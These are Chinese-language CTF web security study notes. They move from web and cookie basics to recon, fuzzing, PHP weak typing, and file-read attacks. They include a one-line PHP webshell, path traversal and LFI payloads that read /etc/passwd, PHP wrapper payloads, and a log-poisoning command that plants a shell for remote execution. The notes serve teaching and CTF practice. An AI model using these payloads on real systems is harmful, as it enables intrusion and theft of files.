
## 1. Web
Web（World Wide Web）是建立在網際網路（Internet）上的資訊系統，由瀏覽器（Client）與伺服器（Server）進行互動，透過 HTTP 協議傳遞資料。

### 基本結構
- Client（用戶端）：如 Chrome，發出請求、接收與呈現網頁內容。
- Server（伺服器）**：如 Apache/Nginx，接收請求、回傳 HTML/CSS/JS 等資源。
- HTTP(S)：資料傳輸協定，常見動作為 GET / POST。
- 網址（URL）：資源定位方式，如 `https://example.com/index.html`。

### 一次瀏覽器請求的流程：
1. 使用者輸入網址
2. DNS 查詢網址對應 IP
3. 與伺服器建立連線（TCP / TLS）
4. 發出 HTTP 請求（如 GET）
5. 接收伺服器回應的 HTML / CSS / JS
6. 呈現在瀏覽器畫面中


### 前端基礎

#### HTML
- 網頁的基本骨架，使用標籤（tag）來結構化內容。
```html
<h1>Hello JYC</h1>
<a href='flag.txt'>點我</a>
```

#### CSS
- 控制樣式（顏色、大小、位置）。
```css
body {
  background-color: black;
  color: #00ff00;
}
```

#### JavaScript
- 網頁的邏輯與互動語言，可控制 DOM、處理事件、操作 Cookie。
```javascript
document.cookie = 'jyc_token=1234';
alert('Hello from JS');
```

---

### Cookie 機制與應用

#### 什麼是 Cookie？
- Cookie 是瀏覽器儲存在本機的小型資料，常用於記憶登入狀態或使用者偏好。

#### 常見應用
- 登入驗證（token）
- 記住登入帳號
- 購物車資訊保存

#### Cookie 工具
- document.cookie：用 JS 存取 cookie
- 開發者工具 (F12) $\rightarrow$ Application $\rightarrow$ Cookies
- 修改 Cookie $\rightarrow$ 嘗試 Bypass 權限驗證

[Cookie-Editor](https://cookie-editor.com/)

---

### 雜湊（Hash）

#### Hash 是什麼？
- 將任意長度的資料輸入，輸出固定長度的不可逆字串，常用於密碼加密、完整性驗證。

#### ▸ 常見 Hash 演算法：
- MD5（128 位元，容易碰撞）
- SHA1（160 位元，也已不安全）
- SHA256 / SHA3（目前安全性較高）
```python
import hashlib

passwd = '1234'
print(hashlib.md5(passwd.encode()).hexdigest())  # e.g. '81dc9bdb52d04dc20036dbd8313ed055'
```

#### Hash 碰撞（Collision）
- 不同輸入產生相同輸出。CTF 題中可能用來繞過雜湊比對。

[SHA1](https://shattered.io/)

[MD5](https://www.mscs.dal.ca/~selinger/md5collision/)

---

### 工具

#### F12 開發者工具（DevTools）
- Elements：查看 HTML 結構，編輯前端內容
- Console：輸入 JavaScript 測試操作
- Network：觀察請求與回應 headers / cookies / status
- Application：查看 Cookie、LocalStorage、SessionStorage

#### curl（命令列發送 HTTP 請求）
```bash
curl http://example.com
curl -X POST -d 'user=admin&pass=1234' http://target.com/login
curl -b 'admin=1' http://target.com/panel
```

#### [Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
#### [Wappalyzer](https://www.wappalyzer.com/)

---

## 2. Web Security

### 解題三階段：Recon → Fuzz → Attack

#### Recon（偵察）

- 確認網站結構（robots.txt、路徑、隱藏檔案）
- 嘗試子域名列舉、備份檔案、Git 洩漏、錯誤訊息
- 觀察網址參數、Cookie、HTTP Header 等輸入點

#### Fuzz（模糊測試）

- 嘗試特殊輸入值觀察回應（如 `?id='`, `%00`, `<script>`）
- 嘗試各種參數組合與字典爆破
- 改變請求方法與 headers

#### Attack（實際攻擊）

- 利用明確弱點執行攻擊（LFI、Webshell、SQLi、繞過）
- 撰寫腳本實作利用或爆破
- 觀察 flag 輸出點與系統回應

---

### 資訊洩漏與偵察技巧（Info Leak）

#### robots.txt

- 位置固定於網站根目錄：`/robots.txt`
- 用於指示搜尋引擎不索引哪些頁面
- 有時含有管理路徑或 flag 提示

```
http://target.com/robots.txt
```

#### .git 洩漏（Git Leak）

- 如果網站部署時未刪除 `.git` 目錄，可能被還原出原始碼
- 工具推薦：[GitHack](https://github.com/lijiejie/GitHack)

```bash
python GitHack.py http://www.target.com/.git/
```

#### Vim Swapfile 洩漏

- Vim 產生的 `.swp`, `.swo` 可能包含原始程式碼
- 嘗試讀取檔名加上 `.swp`：
```
http://target.com/index.php.swp
```

- 可用 `strings` 工具查看：
```bash
strings index.php.swp
```

#### 備份檔案 (.bak, .old, ~)

- 常見於開發時誤留的備份副檔名
- 嘗試加入以下副檔名：
```
index.php.bak
login.php.old
config.php~
```

#### Google Hacking（Dork）

- 使用搜尋引擎語法找出潛在可疑頁面
```
site:target.com intitle:index.of
site:target.com inurl:admin
filetype:log
```
---

### 工具輔助

#### ffuf（快速模糊測試）

```bash
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

#### gobuster（路徑爆破）

```bash
gobuster dir -u http://target.com -w common.txt
```

#### 子域名工具

- [https://subdomainfinder.c99.nl/](https://subdomainfinder.c99.nl)

---

### 後端安全機制

#### Language Trick - PHP 弱型別繞過

PHP 的 `==` 會進行型別轉換，導致繞過驗證：

```php
if ($_GET['pass'] == '0') { // 'false' == 0 為 true
    echo 'Login success';
} # ?pass=false
```

#### Array Injection（參數陣列）

PHP 中 `name[]=x&name[]=y` → 傳入 array，可導致邏輯錯誤：

```http
POST /login
username[]=admin&username[]=guest
```

#### Web 型態判斷（File vs Route）

| 類型 | 說明 |
|------|------|
| File 型 | URL 對應實際檔案（.php/.html） |
| Route 型 | 使用框架處理路由（Flask, Express） |

判斷方式：
- 看 URL 是否以副檔名結尾
- 嘗試加入 `.php`、或修改路由參數觀察錯誤格式

---

#### Webshell

若可上傳 `.php` 檔，最簡 shell：

```php
<?php system($_GET['cmd']); ?>
```

副檔名繞過技巧：
- `.php.jpg`
- `.phtml`
- 修改 Content-Type: `application/x-php`

#### Path Traversal

嘗試跳目錄讀檔：

```
/view.php?file=../../../../etc/passwd
```

#### Arbitrary File Read

若檔名可控，嘗試讀任意檔案或程式碼：

```
/read?file=../../../config.php
```

#### LFI（Local File Inclusion）

載入本地檔案的漏洞，搭配可控參數：

```
/?file=../../etc/passwd
```

#### PHP 偽協議與解析

PHP 支援以下特殊路徑，可用於繞過或讀檔：

- `php://filter/convert.base64-encode/resource=xxx`
- `php://input` → 可利用 POST 傳送內容
- `data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`

Payload 範例：

```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

#### LFI to RCE 技巧

##### Log Poisoning

- 嘗試寫入 apache log，並從 `/var/log/apache2/access.log` 包含執行

```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com
http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id
```

